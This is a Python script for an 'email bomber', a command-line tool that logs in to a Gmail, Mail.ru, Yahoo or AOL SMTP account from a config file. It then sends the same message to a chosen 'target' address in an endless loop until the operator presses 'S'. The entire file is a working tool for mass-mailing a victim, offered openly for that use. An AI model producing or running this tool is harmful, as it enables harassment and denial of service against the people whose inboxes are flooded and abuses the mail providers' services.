# imports
import configparser
import smtplib
import keyboard
import threading
from rich import print
from email.mime.text import MIMEText


def invert_event(key_event):
    if start_event.is_set():
        start_event.clear()
    else:
        start_event.set()


# S listening
def listen_S():
    keyboard.on_release_key(key='S', callback=invert_event)


# main
while True:
    try:
        print("""
1 - Bomb an [cyan]email[/cyan]
2 - Change [cyan]email service[/cyan]
                 """)
        choice = int(input(">>> "))
    except ValueError:
        print("[bold red]Please, type number.")
    else:
        if choice == 1:
            # taking information from config.ini
            config = configparser.ConfigParser()
            config.read("config.ini")
            sender_email = config["Email"]["email"]
            sender_password = config["Email"]["password"]
            sender_host = config["Email"]["host"]
            sender_port = config["Email"]["port"]

            # taking other information by input
            target_email = input("Email of your target?: ")
            text = input("Text?: ")

            # connecting to SMTP
            print("\n[yellow]Trying to connect via a secure connection...", end=" ")
            smtpObj = smtplib.SMTP(sender_host, sender_port)
            smtpObj.starttls()
            print("[bold green]success!\n")

            # waiting for pushing button
            print("[bold yellow]Waiting for pushing 'S' button...\n")
            start_event = threading.Event()
            threading.Thread(target=listen_S).run()
            start_event.wait()
            
            total_emails = 0

            # boom boom
            while start_event.is_set():
                try:
                    print("[yellow]Trying to send an email...", end=" ")

                    smtpObj.login(sender_email, sender_password)

                    smtpObj.sendmail(sender_email, target_email, text)

                    print("[bold green]success!")
                    total_emails += 1

                # errors
                except smtplib.SMTPAuthenticationError:
                    print("[bold red]wrong email or password (or you forget about turning on less secure apps in your google account)! [ERROR]")
                    break

                except smtplib.SMTPRecipientsRefused:
                    print("[bold red]invalid resiever's email [ERROR]")
                    break

                except UnicodeError:
                    msg = MIMEText(text, 'plain', 'utf-8')
                    smtpObj.sendmail(
                        sender_email, target_email, msg.as_string())
                    print("success!")

                except:
                    print(f"[bold red]some error occured [ERROR]")
                    break
            
            # while button 'S' pushed in 2 time
            print(f"\n[bold red]Stopped by user. {total_emails} emails currently sent.")


        # changing the email service
        elif choice == 2:
            print("1 - [cyan]Gmail[/cyan] (default)\n2 - [cyan]Mail.ru[/cyan]\n3 - [cyan]Yahoo![/cyan]\n4 - [cyan]AOL[/cyan]\n5 - [red]Back[/red]\n")
            while True:
                try:
                    service = int(input(">>> "))

                except ValueError:
                    print("[bold red]Please, type number.")

                else:
                    if service == 1:
                        host = "smtp.gmail.com"
                        port = "587"
                        all_ok = True

                    elif service == 2:
                        host = "smtp.mail.ru"
                        port = "465"
                        all_ok = True

                    elif service == 3:
                        host = "smtp.mail.yahoo.com"
                        port = "465"
                        all_ok = True

                    elif service == 4:
                        host = "smtp.aol.com"
                        port = "587"
                        all_ok = True

                    elif service == 5:
                        print("[bold red]Aborting...")
                        break

                    else:
                        print("[bold red]Type 1 or 2 only!")
                        all_ok = False

                    if all_ok:
                        # writing email service into the config.ini
                        config = configparser.ConfigParser()
                        config.read('config.ini')

                        config['Email']['host'] = host
                        config['Email']['port'] = port

                        with open('config.ini', 'w') as configfile:
                            config.write(configfile)
                        print("[bold green]Success!")

        else:
            print("[bold red]Type 1, 2 or 3 only!")
